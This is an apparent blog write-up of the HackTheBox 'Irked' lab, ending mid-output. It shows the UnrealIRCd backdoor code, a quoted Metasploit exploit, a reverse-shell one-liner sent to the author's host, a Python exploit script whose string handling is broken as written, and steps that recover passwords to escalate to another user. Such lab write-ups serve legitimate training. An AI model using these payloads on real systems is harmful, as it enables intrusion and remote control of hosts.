@@ -1,0 +1,682 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="author" content="Marco Meli">
+  <meta name="description" content="Irked | I enjoyed this box, maybe because it&#39;s easy and I managed to root it without too much struggle. As the name of the box suggests we are dealing...">
+
+  <link rel="icon" type="image/png" href="/favicon-16x16.png" sizes="16x16">
+  <link rel="icon" type="image/png" href="/favicon-32x32.png" sizes="32x32">  
+  <link rel="icon" type="image/png" href="/favicon-96x96.png" sizes="96x96">
+  
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/css/bootstrap.min.css" type="text/css" media="all">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/font.css" type="text/css" media="all">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="https://sittingducks.io/theme/css/style.css" type="text/css" media="all">
+
+  
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
+  <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.6/js/bootstrap.min.js"></script>
+  <script type="text/javascript" src="https://sittingducks.io/theme/js/functions.min.js"></script>
+
+  <link href="https://sittingducks.io/theme/css/colorbox.css" rel="stylesheet">
+
+  <link href="https://fonts.googleapis.com/css?family=Squada+One|Source+Code+Pro|Merriweather:300|Abril+Fatface" rel="stylesheet">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/normalize/8.0.1/normalize.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+  <script src="/theme/tipuesearch/tipuesearch_set.js"></script>
+  <script src="/tipuesearch_content.js"></script>
+  <link rel="stylesheet" href="/theme/tipuesearch/tipuesearch.css">
+  <script src="/theme/tipuesearch/tipuesearch.js"></script>
+ 
+
+
+<meta name="keywords" content="HackTheBox">
+
+
+  <title>Irked</title>
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-156989597-1', 'auto');
+  ga('send', 'pageview');
+
+</script>
+  
+</head>
+
+<body class="home blog">
+  <div>
+    <header class="site-header">
+      <nav class="navbar navbar-default" role="navigation"> 
+	  
+		<form id="searchform" action="/search" onsubmit="return (this.elements['q'].value.length > 0)">
+		<input id="searchbox" type="text" name="q" size="12" placeholder="Search">
+		</form>
+		
+        <div class="container">
+          <div class="row">
+            <div class="site-navigation-inner col-sm-12">
+              <div class="navbar-header">
+                <button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-ex1-collapse">
+                  <span class="sr-only">Toggle navigation</span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                  <span class="icon-bar"></span>
+                </button>
+              </div>
+              <div class="collapse navbar-collapse navbar-ex1-collapse">
+              <ul id="menu-all-pages" class="nav navbar-nav">
+                <li class="menu-item"><a href="htts://sittingducks.io" >home
+<i class="fa  fa-lg"></i></a></li>
+              </ul>
+              </div>
+              <div class="social">   
+                <a href="https://linkedin.com/in/marco-meli-12668530/" title="Linkedin" >
+<i class="fa fa-linkedin fa-lg"></i></a>
+                <a href="https://twitter.com/M4rC0ff" title="Twitter" >
+<i class="fa fa-twitter fa-lg"></i></a>
+                <a href="https://github.com/M4rc0ff" title="github" >
+<i class="fa fa-github fa-lg"></i></a>
+              </div>
+            </div>
+          </div>
+        </div>
+      </nav><!-- .site-navigation -->
+
+      <div class="container">
+      <div id="logo">
+        <span class="site-name"><a class="navbar-brand" href="https://sittingducks.io"><img width="310" src="../images/logo.png" class="attachment-full size-full" alt="logo">          </a>
+        </span><!-- end of .site-name -->
+      </div><!-- end of #logo -->
+        <div class="tagline">
+                <a href="https://sittingducks.io/tag/cheatsheets.html" >CheatSheets (1)</a> &#124; 
+                <a href="https://sittingducks.io/tag/hackthebox.html" >HackTheBox (32)</a> &#124; 
+                <a href="https://sittingducks.io/tag/vulnhub.html" >VulnHub (1)</a> &#124; 
+                <a href="https://sittingducks.io/archives.html" >Archives (34)</a>
+        </div>
+    </div>
+
+  </header><!-- #masthead -->
+  </div>
+    <div id="content" class="site-content">
+      <div class="container main-content-area">
+        <div class="row">
+          <div class="main-content-inner col-sm-12 col-md-12">
+            <div id="primary" class="content-area">
+              <div id="main" class="site-main" role="main">
+                <div class="article-container">
+<article>
+  <div class="blog-item-wrap">
+    <div class="post-inner-content">
+      <header class="entry-header page-header">
+        <span class="cat-item"><time datetime="2020-06-04 14:33:00+01:00">Thu 04 June 2020</time></span>
+        <h1 class="entry-title"><a href="https://sittingducks.io/Irked.html">Irked</a></h1>
+      </header><!-- .entry-header -->
+      <div class="fb-like" data-href="https://sittingducks.io/Irked.html" data-layout="standard" data-action="like" data-show-faces="false" data-share="true"></div>
+      <div class="entry-content">
+        <p>I enjoyed this box, maybe because it's easy and I managed to root it without too much struggle. As the name of the box suggests we are dealing with the IRC (Internet Relay Chat) protocol. IRC is an old messaging protocol still very active nowadays. UnrealIRC is a server implementation of IRC which has been compromised in the past and got backdoored. We are going to leverage that to get initial foothold, I also wrote a little python script to achieve that. Privesc is quite easy too, the only difficult part was to indentify a weak SUID file but after that it was easy to get root access. </p>
+<h1 id="recon">Recon</h1>
+<p>I start with a full tcp scan using <code>masscan</code>:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo masscan -p1-65535 <span class="m">10</span>.10.10.117 -e tun0 --rate<span class="o">=</span><span class="m">1000</span>                          
+<span class="go">[sudo] password for m4rc0ff:                                                                            </span>
+
+<span class="go">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-06-04 13:26:17 GMT                                                                                                                                        </span>
+<span class="go"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth </span>
+<span class="go">Initiating SYN Stealth Scan</span>
+<span class="go">Scanning 1 hosts [65535 ports/host]                                                                     </span>
+<span class="go">Discovered open port 65534/tcp on 10.10.10.117                                 </span>
+<span class="go">Discovered open port 80/tcp on 10.10.10.117                                     </span>
+<span class="go">Discovered open port 22/tcp on 10.10.10.117                                     </span>
+<span class="go">Discovered open port 111/tcp on 10.10.10.117                                    </span>
+<span class="go">Discovered open port 8067/tcp on 10.10.10.117                                   </span>
+<span class="go">Discovered open port 58697/tcp on 10.10.10.117                                  </span>
+<span class="go">Discovered open port 6697/tcp on 10.10.10.117                                   </span>
+</pre></div>
+
+
+<p>The second step is to enumerate the services behind the ports found by <code>masscan</code>, we can use  <code>nmap</code> for that:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -sC -sV -p65534,80,22,111,8067,58697,6697 <span class="m">10</span>.10.10.117
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-04 14:28 BST</span>
+<span class="go">Nmap scan report for 10.10.10.117</span>
+<span class="go">Host is up (0.090s latency).</span>
+
+<span class="go">PORT      STATE SERVICE VERSION</span>
+<span class="go">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)</span>
+<span class="go">| ssh-hostkey: </span>
+<span class="go">|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)</span>
+<span class="go">|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)</span>
+<span class="go">|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)</span>
+<span class="go">|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)</span>
+<span class="go">80/tcp    open  http    Apache httpd 2.4.10 ((Debian))</span>
+<span class="go">|_http-server-header: Apache/2.4.10 (Debian)</span>
+<span class="go">|_http-title: Site doesn&#39;t have a title (text/html).</span>
+<span class="go">111/tcp   open  rpcbind 2-4 (RPC #100000)</span>
+<span class="go">| rpcinfo: </span>
+<span class="go">|   program version    port/proto  service</span>
+<span class="go">|   100000  2,3,4        111/tcp   rpcbind</span>
+<span class="go">|   100000  2,3,4        111/udp   rpcbind</span>
+<span class="go">|   100000  3,4          111/tcp6  rpcbind</span>
+<span class="go">|   100000  3,4          111/udp6  rpcbind</span>
+<span class="go">|   100024  1          34797/tcp6  status</span>
+<span class="go">|   100024  1          50110/udp   status</span>
+<span class="go">|   100024  1          54988/udp6  status</span>
+<span class="go">|_  100024  1          58697/tcp   status</span>
+<span class="go">6697/tcp  open  irc     UnrealIRCd</span>
+<span class="go">8067/tcp  open  irc     UnrealIRCd</span>
+<span class="go">58697/tcp open  status  1 (RPC #100024)</span>
+<span class="go">65534/tcp open  irc     UnrealIRCd</span>
+<span class="go">Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+
+<span class="go">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 75.12 seconds</span>
+</pre></div>
+
+
+<p>The default web page shows this:</p>
+<p><img alt="" src="../images/irked-port80.png"></p>
+<p>another hint towards IRC!</p>
+<p><code>nmap</code> found the following open ports which relate to the IRC protocol, in particular UnrealIRC:</p>
+<ul>
+<li>6697/tcp  open  irc     UnrealIRCd</li>
+<li>8067/tcp  open  irc     UnrealIRCd</li>
+<li>65534/tcp open  irc     UnrealIRCd</li>
+</ul>
+<p>UnrealIRC is one of the most popular IRC server software in the wild. In June 2010 the download mirrors of the software were found to be compromised apparently since November 2009. A backdoored version of the software was uploaded so that everyone who downloaded it and installed that version was affected. <code>nmap</code> contains an nse script which allows us to check if the version of the software is the backdoored one:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> nmap -d -p6697 --script<span class="o">=</span>irc-unrealircd-backdoor.nse <span class="m">10</span>.10.10.117
+<span class="go">Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-05 06:26 BST</span>
+<span class="go">--------------- Timing report ---------------</span>
+<span class="go">  hostgroups: min 1, max 100000</span>
+<span class="go">  rtt-timeouts: init 1000, min 100, max 10000</span>
+<span class="go">  max-scan-delay: TCP 1000, UDP 1000, SCTP 1000</span>
+<span class="go">  parallelism: min 0, max 0</span>
+<span class="go">  max-retries: 10, host-timeout: 0</span>
+<span class="go">  min-rate: 0, max-rate: 0</span>
+<span class="go">---------------------------------------------</span>
+<span class="go">NSE: Using Lua 5.3.</span>
+<span class="go">NSE: Arguments from CLI: </span>
+<span class="go">NSE: Loaded 1 scripts for scanning.</span>
+<span class="go">NSE: Script Pre-scanning.</span>
+<span class="go">NSE: Starting runlevel 1 (of 1) scan.</span>
+<span class="go">Initiating NSE at 06:26</span>
+<span class="go">Completed NSE at 06:26, 0.00s elapsed</span>
+<span class="go">Initiating Ping Scan at 06:26</span>
+<span class="go">Scanning 10.10.10.117 [2 ports]</span>
+<span class="go">Completed Ping Scan at 06:26, 0.12s elapsed (1 total hosts)</span>
+<span class="go">Overall sending rates: 16.51 packets / s.</span>
+<span class="go">mass_rdns: Using DNS server 192.168.16.2</span>
+<span class="go">Initiating Parallel DNS resolution of 1 host. at 06:26</span>
+<span class="go">mass_rdns: 0.07s 0/1 [#: 1, OK: 0, NX: 0, DR: 0, SF: 0, TR: 1]</span>
+<span class="go">Completed Parallel DNS resolution of 1 host. at 06:26, 0.07s elapsed</span>
+<span class="go">DNS resolution of 1 IPs took 0.07s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span>
+<span class="go">Initiating Connect Scan at 06:26</span>
+<span class="go">Scanning 10.10.10.117 [1 port]</span>
+<span class="go">Discovered open port 6697/tcp on 10.10.10.117</span>
+<span class="go">Completed Connect Scan at 06:26, 0.09s elapsed (1 total ports)</span>
+<span class="go">Overall sending rates: 10.86 packets / s.</span>
+<span class="go">NSE: Script scanning 10.10.10.117.</span>
+<span class="go">NSE: Starting runlevel 1 (of 1) scan.</span>
+<span class="go">Initiating NSE at 06:26</span>
+<span class="go">NSE: Starting irc-unrealircd-backdoor against 10.10.10.117:6697.</span>
+<span class="go">NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Sending command: TIME</span>
+<span class="go">NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Sending command: AB;SOMETHINGUNIQUE;sleep 8;ping -n 9 127.0.0.1;</span>
+<span class="go">NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Received a response to our command in 8 seconds</span>
+<span class="go">NSE: [irc-unrealircd-backdoor 10.10.10.117:6697] Looks like the Trojanned unrealircd is running!</span>
+<span class="go">NSE: Finished irc-unrealircd-backdoor against 10.10.10.117:6697.</span>
+<span class="go">Completed NSE at 06:27, 18.42s elapsed</span>
+<span class="go">Nmap scan report for 10.10.10.117</span>
+<span class="go">Host is up, received syn-ack (0.12s latency).</span>
+<span class="go">Scanned at 2020-06-05 06:26:52 BST for 19s</span>
+
+<span class="go">PORT     STATE SERVICE REASON</span>
+<span class="go">6697/tcp open  ircs-u  syn-ack</span>
+<span class="go">|_irc-unrealircd-backdoor: Looks like trojaned version of unrealircd. See http://seclists.org/fulldisclosure/2010/Jun/277</span>
+<span class="go">Final times for host: srtt: 117384 rttvar: 98033  to: 509516</span>
+
+<span class="go">NSE: Script Post-scanning.</span>
+<span class="go">NSE: Starting runlevel 1 (of 1) scan.</span>
+<span class="go">Initiating NSE at 06:27</span>
+<span class="go">Completed NSE at 06:27, 0.00s elapsed</span>
+<span class="go">Read from /usr/bin/../share/nmap: nmap-payloads nmap-services.</span>
+<span class="go">Nmap done: 1 IP address (1 host up) scanned in 18.84 seconds</span>
+</pre></div>
+
+
+<p>The above scan on port 6697 shows that we are indeed dealing with the "trojaned" version of the UnrealIRC. <a href="https://blog.stalkr.net/2010/06/unrealircd-3281-backdoored.html">This article</a> is a good one to understand a bit more about the logic behind the backdoor. </p>
+<p>To sum up, the malicious bit of code is hiding itself as a debug kind of functionality. This is the interesting bit:</p>
+<div class="highlight"><pre><span></span><span class="cp">#ifdef DEBUGMODE3</span>
+       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">memcmp</span><span class="p">(</span><span class="n">readbuf</span><span class="p">,</span> <span class="n">DEBUGMODE3_INFO</span><span class="p">,</span> <span class="mi">2</span><span class="p">))</span>
+           <span class="n">DEBUG3_LOG</span><span class="p">(</span><span class="n">readbuf</span><span class="p">);</span>
+<span class="cp">#endif</span>
+</pre></div>
+
+
+<p>where <code>DEBUG3_LOG</code> will end up being a call to <code>system()</code> and <code>DEBUGMODE3_INFO</code> is just the string <code>AB</code>. This means that any commands sent to the IRC server that start with <code>AB</code> will be handed off directly to <code>system()</code>. </p>
+<p>Using <code>system()</code>, we can execute any command that can run on terminal if operating system allows. For example, we can call system(“ls”) to list contents of a directory, but obviosly we can do more dangerous things like getting a reverse shell.</p>
+<p>There is a metasploit module for UnrealIRC but for the sake of learning I am not going to use it. I can still use metasploit module to understand how the exploit works though. </p>
+<p>This is the function that triggers the exploit for the metasploit UnrealIRC module available at <code>/usr/share/metasploit-framework/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb</code> in my kali box:</p>
+<div class="highlight"><pre><span></span><span class="k">def</span> <span class="nf">exploit</span>
+    <span class="n">connect</span>
+
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Connected to </span><span class="si">#{</span><span class="n">rhost</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">rport</span><span class="si">}</span><span class="s2">...&quot;</span><span class="p">)</span>
+    <span class="n">banner</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">get_once</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
+    <span class="n">banner</span><span class="o">.</span><span class="n">to_s</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">line</span><span class="o">|</span>
+      <span class="n">print_line</span><span class="p">(</span><span class="s2">&quot;    </span><span class="si">#{</span><span class="n">line</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="k">end</span>
+
+    <span class="n">print_status</span><span class="p">(</span><span class="s2">&quot;Sending backdoor command...&quot;</span><span class="p">)</span>
+    <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="s2">&quot;AB;&quot;</span> <span class="o">+</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="c1"># Wait for the request to be handled</span>
+    <span class="mi">1</span><span class="o">.</span><span class="n">upto</span><span class="p">(</span><span class="mi">120</span><span class="p">)</span> <span class="k">do</span>
+      <span class="k">break</span> <span class="k">if</span> <span class="n">session_created?</span>
+      <span class="nb">select</span><span class="p">(</span><span class="kp">nil</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span> <span class="kp">nil</span><span class="p">,</span> <span class="mi">0</span><span class="o">.</span><span class="mi">25</span><span class="p">)</span>
+      <span class="n">handler</span><span class="p">()</span>
+    <span class="k">end</span>
+    <span class="n">disconnect</span>
+  <span class="k">end</span>
+</pre></div>
+
+
+<p>According to the explanation of the fake debug function, the ruby code above connects to the IRC server (rhost) and then sends a payload precedeed by the <code>AB</code> string. </p>
+<p>So I can easily perform the same steps manually:</p>
+<p>1) I connect to the IRC server on port 6697 using netcat:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc <span class="m">10</span>.10.10.117 <span class="m">6697</span>
+<span class="go">:irked.htb NOTICE AUTH :*** Looking up your hostname...</span>
+<span class="go">:irked.htb NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead</span>
+</pre></div>
+
+
+<p>2) I open a netcat listner on my box on a port I choose, 443 in this case:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">listening on [any] 443 ..</span>
+</pre></div>
+
+
+<p>3) I submit a reverse shell oneliner (got it from <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">pentestmonkey</a>) prepended by the <code>AB</code> string to the netcat        connection I had created on step 1. </p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc <span class="m">10</span>.10.10.117 <span class="m">6697</span>
+<span class="go">:irked.htb NOTICE AUTH :*** Looking up your hostname...</span>
+<span class="go">:irked.htb NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead</span>
+<span class="go">AB; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.18 443 &gt;/tmp/f</span>
+</pre></div>
+
+
+<p>4) I get my reverse shell back:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.18] from (UNKNOWN) [10.10.10.117] 57600</span>
+<span class="go">bash: cannot set terminal process group (641): Inappropriate ioctl for device</span>
+<span class="go">bash: no job control in this shell</span>
+<span class="gp">ircd@irked:~/Unreal3.2$</span> whoami
+<span class="go">whoami</span>
+<span class="go">ircd</span>
+<span class="gp">ircd@irked:~/Unreal3.2$</span>
+</pre></div>
+
+
+<p>We are in!</p>
+<p>I also wrote a little python script that does the same work. The script does not do any checks and it's very basic, but it does work!</p>
+<div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>
+
+<span class="n">IRC_IP</span> <span class="o">=</span> <span class="s1">&#39;10.10.10.117&#39;</span>
+<span class="n">IRC_PORT</span> <span class="o">=</span> <span class="mi">6697</span>
+<span class="n">My_IP</span> <span class="o">=</span> <span class="s1">&#39;10.10.14.18&#39;</span>
+<span class="n">My_PORT</span> <span class="o">=</span> <span class="mi">443</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc My_IP My_PORT &gt;/tmp/f&#39;</span>
+
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IRC_IP</span><span class="p">,</span> <span class="nb">int</span><span class="p">(</span><span class="n">IRC_PORT</span><span class="p">)))</span>
+<span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;AB;  + payload + </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+
+
+<p>Once I make the above script executable, I setup a netcat listener on port 443 and run the script. And voila' our shell again:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~$</span> sudo nc -lnvp <span class="m">443</span>
+<span class="go">[sudo] password for m4rc0ff: </span>
+<span class="go">listening on [any] 443 ...</span>
+<span class="go">connect to [10.10.14.18] from (UNKNOWN) [10.10.10.117] 57601</span>
+<span class="go">bash: cannot set terminal process group (641): Inappropriate ioctl for device</span>
+<span class="go">bash: no job control in this shell</span>
+<span class="gp">ircd@irked:~/Unreal3.2$</span> whoami
+<span class="go">whoami</span>
+<span class="go">ircd</span>
+<span class="gp">ircd@irked:~/Unreal3.2$</span>
+</pre></div>
+
+
+<p>I looked up for the <code>user.txt</code> flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">ircd@irked:~$</span> locate user.txt
+<span class="go">locate user.txt</span>
+<span class="go">/home/djmardov/Documents/user.txt</span>
+<span class="go">/usr/share/doc/fontconfig/fontconfig-user.txt.gz</span>
+<span class="gp">ircd@irked:~$</span> cat /home/djmardov/Documents/user.txt
+<span class="go">cat /home/djmardov/Documents/user.txt</span>
+<span class="go">cat: /home/djmardov/Documents/user.txt: Permission denied</span>
+</pre></div>
+
+
+<p>This means we have to privesc to <code>djmardov</code> to get the flag.</p>
+<p>Let's look for hidden files in the home directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">ircd@irked:/home$</span> find /home/ -type f -iname <span class="s2">&quot;.*&quot;</span> -ls <span class="m">2</span>&gt; /dev/null
+<span class="go">1062367    4 -rw-------   1 ircd     ircd          124 Apr 24  2004 /home/ircd/Unreal3.2/.cvsignore</span>
+<span class="go">1062303    4 -rw-------   1 ircd     ircd          932 Apr 13  2009 /home/ircd/Unreal3.2/.CHANGES.NEW</span>
+<span class="go">1062261    8 -rw-------   1 ircd     ircd         5623 Apr 13  2009 /home/ircd/Unreal3.2/.RELEASE.NOTES</span>
+<span class="go">1062360    4 -rw-------   1 ircd     ircd         2791 Apr 24  2004 /home/ircd/Unreal3.2/.bugreport.gdb</span>
+<span class="go">1062356    4 -rw-------   1 ircd     ircd         1645 Apr 24  2004 /home/ircd/Unreal3.2/.CONFIG.RANT</span>
+<span class="go">1179206    4 -rw-------   1 ircd     ircd            2 Apr 24  2004 /home/ircd/Unreal3.2/keys/.KEYS</span>
+<span class="go">1062306    4 -rw-------   1 ircd     ircd          519 Dec 10  2000 /home/ircd/Unreal3.2/.UPDATE</span>
+<span class="go">1062308    4 -rw-------   1 ircd     ircd         1060 Apr 24  2004 /home/ircd/Unreal3.2/.SICI</span>
+<span class="go">1062357    4 -rw-------   1 ircd     ircd          794 Aug 20  2000 /home/ircd/Unreal3.2/.indent.pro</span>
+<span class="go">1061896    4 -rw-------   1 ircd     ircd          345 Jun  5 03:12 /home/ircd/.bash_history</span>
+<span class="go">1061889    4 -rw-r--r--   1 ircd     ircd           66 May 14  2018 /home/ircd/.selected_editor</span>
+<span class="go">1061890    0 -rw-r--r--   1 ircd     ircd            0 May 14  2018 /home/ircd/.bashrc</span>
+<span class="go">1061885    4 -rw-r--r--   1 djmardov djmardov      675 May 11  2018 /home/djmardov/.profile</span>
+<span class="go">1177807    4 -rw-r--r--   1 djmardov djmardov       52 May 16  2018 /home/djmardov/Documents/.backup</span>
+<span class="go">1061897    8 -rw-------   1 djmardov djmardov     4706 Nov  3  2018 /home/djmardov/.ICEauthority</span>
+<span class="go">1061886    4 -rw-r--r--   1 djmardov djmardov      220 May 11  2018 /home/djmardov/.bash_logout</span>
+<span class="go">1061887    4 -rw-r--r--   1 djmardov djmardov     3515 May 11  2018 /home/djmardov/.bashrc</span>
+</pre></div>
+
+
+<p>There is a file named <code>backup</code> in the <code>djmardov/Documents</code> directory:</p>
+<div class="highlight"><pre><span></span><span class="gp">ircd@irked:/home$</span> file djmardov/Documents/.backup 
+<span class="go">djmardov/Documents/.backup: ASCII text</span>
+<span class="gp">ircd@irked:/home$</span> cat djmardov/Documents/.backup     
+<span class="go">Super elite steg backup pw</span>
+<span class="go">UPupDOWNdownLRlrBAbaSSss</span>
+</pre></div>
+
+
+<p>It's a text file and contains something that looks like a password.</p>
+<div class="highlight"><pre><span></span><span class="gp">ircd@irked:/home$</span> su djmardov
+<span class="go">Password: </span>
+<span class="go">su: Authentication failure</span>
+</pre></div>
+
+
+<p>I tried to login as <code>djmardov</code> but didn't work. One thing I noticed is the workd "steg" in the backup file content.</p>
+<p>I searched for files with most common extension for images in the box but did not find anything. The only image I could think of is the one on the default website. So I download the image to my kali box and then I ran <code>steghide</code> to extract the content:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/irked$</span> steghide --extract -sf irked.jpg 
+<span class="go">Enter passphrase: </span>
+<span class="go">wrote extracted data to &quot;pass.txt&quot;.</span>
+</pre></div>
+
+
+<p>So apparently there was something in there and it was extracted on a file:</p>
+<div class="highlight"><pre><span></span><span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/irked$</span> cat pass.txt 
+<span class="go">Kab6h+m+bbp2J:HG</span>
+<span class="gp">m4rc0ff@SittingDucks:~/Documents/htbBoxes/irked$</span> ssh djmardov@10.10.10.117
+<span class="go">djmardov@10.10.10.117&#39;s password: </span>
+
+<span class="go">The programs included with the Debian GNU/Linux system are free software;</span>
+<span class="go">the exact distribution terms for each program are described in the</span>
+<span class="go">individual files in /usr/share/doc/*/copyright.</span>
+
+<span class="go">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span>
+<span class="go">permitted by applicable law.</span>
+<span class="go">Last login: Tue May 15 08:56:32 2018 from 10.33.3.3</span>
+<span class="gp">djmardov@irked:~$</span> whoami
+<span class="go">djmardov</span>
+<span class="gp">djmardov@irked:~$</span>
+</pre></div>
+
+
+<p>The file showed another password and when I tried to ssh as <code>djmardov</code> I was successful and able to grab the flag:</p>
+<div class="highlight"><pre><span></span><span class="gp">djmardov@irked:~/Documents$</span> cat user.txt 
+<span class="go">4a****************************8e</span>
+</pre></div>
+
+
+<p>At this stage I decided to run <a href="https://github.com/rebootuser/LinEnum">LinEnum</a> to gather information that could help us to root the box.</p>
+<p>I ran a python SimpleHTTPServer on my kali box in the same directory where I have <code>LinEnum.sh</code> and then I downloaded to the victim machine using wget.</p>
+<p>Then I ran the script and started going through the output. The output is large so I paste here just what I found interesting and relevant:</p>
+<div class="highlight"><pre><span></span><span class="go">[-] SUID files:                                                                                                                                                                                                  </span>
+<span class="go">-rwsr-xr-- 1 root messagebus 362672 Nov 21  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                     </span>
+<span class="go">-rwsr-xr-x 1 root root 9468 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device                                                                                                                                       </span>
+<span class="go">-rwsr-xr-x 1 root root 13816 Sep  8  2016 /usr/lib/policykit-1/polkit-agent-helper-1                                                                                                                             </span>
+<span class="go">-rwsr-xr-x 1 root root 562536 Nov 19  2017 /usr/lib/openssh/ssh-keysign                                                                                                                                          </span>
+<span class="go">-rwsr-xr-x 1 root root 13564 Oct 14  2014 /usr/lib/spice-gtk/spice-client-glib-usb-acl-helper                                                                                                                    </span>
+<span class="go">-rwsr-xr-x 1 root root 1085300 Feb 10  2018 /usr/sbin/exim4                                                                                                                                                      </span>
+<span class="go">-rwsr-xr-- 1 root dip 338948 Apr 14  2015 /usr/sbin/pppd                                                                                                                                                         </span>
+<span class="go">-rwsr-xr-x 1 root root 43576 May 17  2017 /usr/bin/chsh                                                                                                                                                          </span>
+<span class="go">-rwsr-sr-x 1 root mail 96192 Nov 18  2017 /usr/bin/procmail                                                                                                                                                      </span>
+<span class="go">-rwsr-xr-x 1 root root 78072 May 17  2017 /usr/bin/gpasswd                                                                                                                                                       </span>
+<span class="go">-rwsr-xr-x 1 root root 38740 May 17  2017 /usr/bin/newgrp                                               </span>
